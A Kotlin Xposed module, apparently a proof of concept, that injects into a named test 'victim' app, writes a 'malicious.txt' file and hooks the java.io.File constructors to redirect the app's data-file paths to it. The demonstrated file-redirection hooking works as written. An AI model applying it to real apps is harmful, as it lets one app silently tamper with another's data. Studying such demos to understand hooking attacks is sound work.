@file:JvmName("XposedModule") // Prevent kotlin from renaming the file
package com.virtualxposed.filespoofer

import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import de.robv.android.xposed.IXposedHookLoadPackage
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage
import java.io.File


class XposedModule : IXposedHookLoadPackage {
    companion object {
        private const val TAG = "FileSpoofer"
        const val VICTIM_APP = "com.virtualxposed.victim"

        private fun log(message: String) {
            XposedBridge.log("$TAG: $message")
        }
    }

    // I prefer this over Application.attach() because the current implementation only
    // supports one hook per function
    fun getApplicationContext(): Context? {
        return try {
            val activityThreadClass = XposedHelpers.findClass("android.app.ActivityThread", null)
            val currentActivityThread =
                XposedHelpers.callStaticMethod(activityThreadClass, "currentActivityThread")
            val application =
                XposedHelpers.callMethod(currentActivityThread, "getApplication") as? Application
            application?.applicationContext
        } catch (_: Exception) {
            null
        }
    }


    @SuppressLint("SdCardPath")
    override fun handleLoadPackage(params: XC_LoadPackage.LoadPackageParam?) {
        if (params?.packageName == BuildConfig.APPLICATION_ID) {
            log("Self-loaded module with version ${BuildConfig.VERSION_NAME}")
            val buildClass = XposedHelpers.findClass(
                MainActivity::class.java.name,
                params.classLoader
            )

            XposedHelpers.setStaticObjectField(
                buildClass,
                MainActivity::isLoaded.name,
                true
            )
            return
        }
        if (params?.packageName != VICTIM_APP) {
            log("Not loading module $TAG since ${params?.packageName} is not $VICTIM_APP")
            return
        }

        log("Loaded malicious module $TAG version ${BuildConfig.VERSION_NAME} to package: ${params?.packageName}")

        if (params == null) return

        val context = getApplicationContext()
        if (context == null) {
            log("Unable to get application context. Quitting early.")
            return
        }

        // /data/user/0/io.va.exposed64/virtual/data/user/0/com.virtualxposed.victim/files/malicious.txt
        val customFile = File("${params.appInfo.dataDir}/files", "malicious.txt")
        customFile.delete()
        customFile.parentFile?.mkdirs()
        customFile.createNewFile()
        customFile.writeText("This is a malicious file")
        val customFilePath = customFile.absolutePath

        val appDir = context.dataDir

        // Hook java.io.File(String path) constructor
        XposedHelpers.findAndHookConstructor(
            File::class.java,
            String::class.java,
            object : XC_MethodHook() {
                @Throws(Throwable::class)
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val originalPath = param.args[0] as? String ?: return

                    if (originalPath == customFilePath) {
                        return
                    }

                    // Only hook app data (prevent crashes)
                    if (!originalPath.startsWith(appDir.absolutePath)) {
                        return
                    }

                    log("Redirecting 1 $originalPath -> $customFilePath")
                    param.args[0] = customFilePath
                }
            }
        )

        // Hook java.io.File(File parent, String child) constructor
        XposedHelpers.findAndHookConstructor(
            File::class.java,
            File::class.java,
            String::class.java,
            object : XC_MethodHook() {
                @Throws(Throwable::class)
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val file = param.args[0] as? File
                    val name = param.args[1] as? String

                    // Only hook app data (prevent crashes)
                    if (file?.startsWith(appDir) == false) {
                        return
                    }

                    log("Redirecting 2 ${file?.absolutePath}/$name -> $customFilePath")
                    param.args[0] = customFile.parentFile
                    param.args[1] = customFile.name
                }
            }
        )
    }
}